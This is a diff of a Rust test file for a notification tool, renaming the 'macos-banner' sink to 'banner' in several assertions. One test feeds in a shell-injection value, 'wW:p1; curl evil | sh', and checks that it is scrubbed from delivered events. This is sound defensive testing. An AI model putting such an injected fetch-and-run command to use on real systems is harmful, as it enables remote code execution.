@@ -16,8 +16,8 @@ fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
             "x",
         ])
         .args(["--pane", "wW:p1; curl evil | sh"]));
-    assert!(sandbox.fired("macos-banner"));
-    assert_eq!(sandbox.event("macos-banner")["pane"], "");
+    assert!(sandbox.fired("banner"));
+    assert_eq!(sandbox.event("banner")["pane"], "");
     assert!(
         stderr(&output).contains("dropped a pane id with shell metacharacters"),
         "{output:?}"
@@ -274,7 +274,7 @@ fn an_observation_stated_as_a_flag_is_as_quiet_as_one_stated_as_json() {
             "--detail",
             "x",
         ]));
-    assert!(sandbox.fired("macos-banner"));
+    assert!(sandbox.fired("banner"));
     assert!(sandbox.fired("hermes"));
     assert!(!sandbox.fired("mobile"), "an observation carded the phone");
 
@@ -313,7 +313,7 @@ fn a_state_outside_the_closed_set_is_refused_and_nothing_is_delivered() {
             "pns: --state requires one of: done, failed, blocked, resolved, observation, progress\n",
             "{word}"
         );
-        assert!(!sandbox.fired("macos-banner"), "{word}");
+        assert!(!sandbox.fired("banner"), "{word}");
         assert!(!sandbox.fired("hermes"), "{word}");
     }
 }
